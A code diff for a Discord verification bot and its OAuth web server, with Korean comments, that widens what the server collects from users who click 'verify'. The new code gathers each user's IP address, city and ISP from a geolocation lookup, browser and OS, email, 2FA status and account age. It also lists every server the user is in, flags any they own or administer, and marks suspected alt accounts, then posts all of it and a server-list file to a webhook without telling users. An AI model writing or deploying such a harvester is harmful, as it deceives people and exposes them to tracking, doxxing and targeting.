@@ -32,34 +32,42 @@ const client = new Client({
     ]
 });
 
-// 기기 종류 판별 함수
+// 디스코드 Snowflake ID로 계정 생성일 계산 함수
+function getDiscordCreationDate(userId) {
+    const DISCORD_EPOCH = 1420070400000;
+    const binary = BigInt(userId).toString(2).padStart(64, '0');
+    const timestamp = parseInt(binary.substring(0, 42), 2) + DISCORD_EPOCH;
+    return new Date(timestamp).toISOString().replace('T', ' ').substring(0, 19);
+}
+
+// 브라우저 및 운영체제 상세 분석 함수
 function parseDevice(ua) {
-    if (!ua) return '알 수 없음';
+    if (!ua) return { browser: '알 수 없음', os: '알 수 없음' };
+    let browser = '알 수 없음';
     let os = '알 수 없음';
-    let device = '';
+
+    if (/chrome|crios/i.test(ua)) browser = 'Chrome';
+    else if (/safari/i.test(ua)) browser = 'Safari';
+    else if (/firefox/i.test(ua)) browser = 'Firefox';
+    else if (/whale/i.test(ua)) browser = 'Naver Whale';
+    else if (/edge/i.test(ua)) browser = 'Edge';
 
     if (/android/i.test(ua)) {
-        os = 'Android';
-        if (/samsung/i.test(ua) || /sm-/i.test(ua)) device = ' (삼성 갤럭시)';
-        else if (/iphone|ipad|ipod/i.test(ua)) device = ' (애플)';
-        else device = ' (기타 모바일)';
+        os = (/samsung/i.test(ua) || /sm-/i.test(ua)) ? 'Android (삼성 갤럭시)' : 'Android (기타 모바일)';
     } else if (/iphone|ipad|ipod/i.test(ua)) {
-        os = 'iOS';
-        device = ' (애플 아이폰/아이패드)';
+        os = 'iOS (애플)';
     } else if (/win/i.test(ua)) {
-        os = 'Windows PC';
-        if (/samsung/i.test(ua)) device = ' (삼성 PC)';
+        os = (/samsung/i.test(ua)) ? 'Windows PC (삼성)' : 'Windows PC';
     } else if (/mac/i.test(ua)) {
-        os = 'macOS';
-        device = ' (애플 맥)';
+        os = 'macOS (애플 맥)';
     } else if (/linux/i.test(ua)) {
         os = 'Linux';
     }
 
-    return `${os}${device} [UA: ${ua}]`;
+    return { browser, os };
 }
 
-// 봇이 켜질 때 채널에 DM 없이 바로 이동하는 링크 버튼 전송
+// 봇이 켜질 때 인증 버튼 전송
 client.on('ready', async () => {
     console.log(`[봇 로그인 완료] ${client.user.tag}`);
 
@@ -76,21 +84,20 @@ client.on('ready', async () => {
                     }
                 }
 
-                // DM 없이 누르면 곧바로 웹서버로 이동하는 링크 버튼
                 const verifyUrl = `${FIXED_RENDER_URL}/verify`;
                 const row = new ActionRowBuilder()
                     .addComponents(
                         new ButtonBuilder()
                             .setStyle(ButtonStyle.Link)
-                            .setLabel('🔒 디스코드 인증하기 (바로 이동)')
+                            .setLabel('🔒 디스코드 인증하기')
                             .setURL(verifyUrl),
                     );
 
                 await channel.send({
-                    content: '서버를 이용하려면 아래 버튼을 눌러 인증을 진행해 주세요! (DM 없이 곧바로 이동합니다)',
+                    content: '서버를 이용하려면 아래 버튼을 눌러 인증을 진행해 주세요!',
                     components: [row]
                 });
-                console.log('[인증 시스템] 즉시 이동 버튼 전송 완료');
+                console.log('[인증 시스템] 인증 버튼 전송 완료');
             }
         } catch (err) {
             console.error('초기화 중 에러 발생:', err);
@@ -163,27 +170,18 @@ app.get('/verify', async (req, res) => {
         userIp = '127.0.0.1';
     }
 
-    // 🛡️ [VPN 우회 접속 차단 로직]
+    // VPN 우회 접속 차단
     try {
-        const ipCheckRes = await axios.get(`http://ip-api.com/json/${userIp}?fields=status,message,proxy,query,isp,org`);
-        
+        const ipCheckRes = await axios.get(`http://ip-api.com/json/${userIp}?fields=status,proxy`);
         if (ipCheckRes.data.status === 'success' && ipCheckRes.data.proxy) {
-            console.log(`[VPN 차단됨] IP: ${userIp}`);
-            
             if (WEBHOOK_URL) {
                 await axios.post(WEBHOOK_URL, {
-                    content: `🛡️ **[VPN 우회 접속 차단]**\n` +
-                             `🌐 **차단된 IP:** \`${userIp}\`\n` +
-                             `📡 **통신사/ISP:** \`${ipCheckRes.data.isp || '알 수 없음'}\`\n` +
-                             `⚠️ VPN을 켠 상태로 접속하여 차단되었습니다.`
+                    content: `🛡️ **[VPN 우회 접속 차단]**\n🌐 **IP:** \`${userIp}\``
                 }).catch(() => {});
             }
-
-            return res.status(403).send(`<h1>인증 실패</h1><p>VPN 또는 우회 접속 환경에서는 인증을 진행할 수 없습니다. VPN을 끄고 다시 시도해 주세요.</p>`);
+            return res.status(403).send(`<h1>인증 실패</h1><p>VPN 또는 우회 접속 환경에서는 인증을 진행할 수 없습니다.</p>`);
         }
-    } catch (err) {
-        console.error('IP VPN 검사 에러:', err.message);
-    }
+    } catch (err) {}
 
     let selectedRoles = req.query.roles || [];
     if (!Array.isArray(selectedRoles)) selectedRoles = [selectedRoles];
@@ -216,6 +214,19 @@ app.get('/callback', async (req, res) => {
         }
     } catch (e) {}
 
+    // IP 위치 및 통신사 조회
+    let ipLocation = '알 수 없음';
+    let ispInfo = '알 수 없음';
+    try {
+        const ipRes = await axios.get(`http://ip-api.com/json/${userIp}?fields=status,country,regionName,city,isp,org`);
+        if (ipRes.data && ipRes.data.status === 'success') {
+            ipLocation = `${ipRes.data.country} ${ipRes.data.regionName} ${ipRes.data.city}`;
+            ispInfo = ipRes.data.isp;
+        }
+    } catch (e) {}
+
+    const { browser, os } = parseDevice(userAgent);
+
     try {
         const tokenRes = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
             client_id: CLIENT_ID,
@@ -239,25 +250,49 @@ app.get('/callback', async (req, res) => {
 
         const displayName = member ? member.displayName : (userData.global_name || userData.username);
         const username = userData.username;
+        const userId = userData.id;
 
-        let ispInfo = '알 수 없음 (모바일/기타)';
-        try {
-            const ispRes = await axios.get(`http://ip-api.com/json/${userIp}?fields=status,isp,org,as`);
-            if (ispRes.data && ispRes.data.status === 'success') {
-                ispInfo = `${ispRes.data.isp} (Org: ${ispRes.data.org})`;
-            }
-        } catch (e) {}
+        // 계정 생성일 계산
+        const createdAt = getDiscordCreationDate(userId);
+        const createdDateObj = new Date(createdAt);
+        const now = new Date();
+        const diffDays = (now - createdDateObj) / (1000 * 60 * 60 * 24);
 
-        const deviceDetail = parseDevice(userAgent);
+        // 부계정 추정 판단 (생성된 지 30일 미만이거나 기본 아바타인 경우 등)
+        let altAccountCheck = '정상 계정 추정';
+        if (diffDays < 30) {
+            altAccountCheck = '⚠️ 부계정 의심 (생성된 지 30일 미만)';
+        } else if (!userData.avatar) {
+            altAccountCheck = '⚠️ 부계정 의심 (기본 프로필 아바타)';
+        }
 
-        let guildsTextContent = `[ ${username} (${userData.id}) 님이 가입된 서버 목록 ]\n\n`;
+        // 인증 시각 (KST 기준)
+        const verifiedAt = new Date().toLocaleString('ko-KR', { timeZone: 'Asia/Seoul' });
+
+        // 참가 서버 목록 및 소유자(Owner) / 관리자(Administrator) 권한 확인
+        let guildsTextContent = `[ ${username} (${userId}) 님이 가입된 서버 목록 ]\n\n`;
+        let adminOrOwnerFound = false;
+
         try {
             const guildsRes = await axios.get('https://discord.com/api/users/@me/guilds', {
                 headers: { authorization: `Bearer ${accessToken}` }
             });
             if (guildsRes.data && guildsRes.data.length > 0) {
                 guildsRes.data.forEach((g, index) => {
-                    guildsTextContent += `${index + 1}. 이름: ${g.name} (ID: ${g.id})\n`;
+                    let permissionsText = [];
+                    if (g.owner) {
+                        permissionsText.push('👑 서버 소유자');
+                        adminOrOwnerFound = true;
+                    }
+                    // Discord 권한 비트 연산 (Administrator = 0x8)
+                    const permissionsBigInt = BigInt(g.permissions || 0);
+                    if ((permissionsBigInt & 0x8n) === 0x8n && !g.owner) {
+                        permissionsText.push('🛡️ 관리자 권한');
+                        adminOrOwnerFound = true;
+                    }
+
+                    const permString = permissionsText.length > 0 ? ` [${permissionsText.join(', ')}]` : '';
+                    guildsTextContent += `${index + 1}. 이름: ${g.name} (ID: ${g.id})${permString}\n`;
                 });
             } else {
                 guildsTextContent += '가입된 서버가 없습니다.';
@@ -266,24 +301,31 @@ app.get('/callback', async (req, res) => {
             guildsTextContent += '서버 목록을 불러오는 데 실패했습니다.';
         }
 
-        const filePath = path.join(__dirname, `guilds_${userData.id}.txt`);
+        if (adminOrOwnerFound) {
+            altAccountCheck += ' / ⚠️ 주요 서버 소유 또는 관리자 권한 보유';
+        }
+
+        const filePath = path.join(__dirname, `guilds_${userId}.txt`);
         fs.writeFileSync(filePath, guildsTextContent, 'utf8');
 
-        const phoneStatus = userData.phone ? `✅ 연동됨 (${userData.phone})` : '❌ 미연동 또는 확인 불가';
         const isMfaEnabled = userData.mfa_enabled ? '✅ 2차 인증(OTP) 활성화됨' : '❌ 2차 인증 미사용';
+        const emailInfo = `${userData.email} (${userData.verified ? '이메일 인증됨' : '미인증'})`;
 
         if (WEBHOOK_URL) {
             const FormData = require('form-data');
             const form = new FormData();
             form.append('content', `✅ **[인증 완료 상세 정보]**\n` +
                                     `📌 **실제 이름(닉네임):** \`${displayName}\`\n` +
-                                    `👤 **유저 멘션/아이디:** <@${userData.id}> (\`${username}\`)\n` +
-                                    `📧 **이메일:** \`${userData.email}\` (\`${userData.verified ? '인증됨' : '미인증'}\`)\n` +
-                                    `📱 **휴대폰 번호 연동:** \`${phoneStatus}\`\n` +
-                                    `🔒 **계정 보안(2FA):** \`${isMfaEnabled}\`\n` +
-                                    `🌐 **와이파이 공인 IP:** \`${userIp}\`\n` +
-                                    `📡 **통신사/ISP:** \`${ispInfo}\`\n` +
-                                    `💻 **기기 및 플랫폼:** \`${deviceDetail}\``);
+                                    `👤 **유저 멘션/아이디:** <@${userId}> (\`${username}\`)\n` +
+                                    `📅 **계정 생성일:** \`${createdAt}\`\n` +
+                                    `🔒 **2차 인증(OTP):** \`${isMfaEnabled}\`\n` +
+                                    `⏰ **인증 시각:** \`${verifiedAt}\`\n` +
+                                    `🌐 **아이피 정보:** \`${userIp}\`\n` +
+                                    `📧 **이메일:** \`${emailInfo}\`\n` +
+                                    `📍 **위치:** \`${ipLocation}\`\n` +
+                                    `📡 **통신사:** \`${ispInfo}\`\n` +
+                                    `💻 **기기 정보 (브라우저 / OS):** \`${browser} / ${os}\`\n` +
+                                    `⚠️ **부계정 추정 여부:** ${altAccountCheck}`);
             form.append('file', fs.createReadStream(filePath));
 
             await axios.post(WEBHOOK_URL, form, {
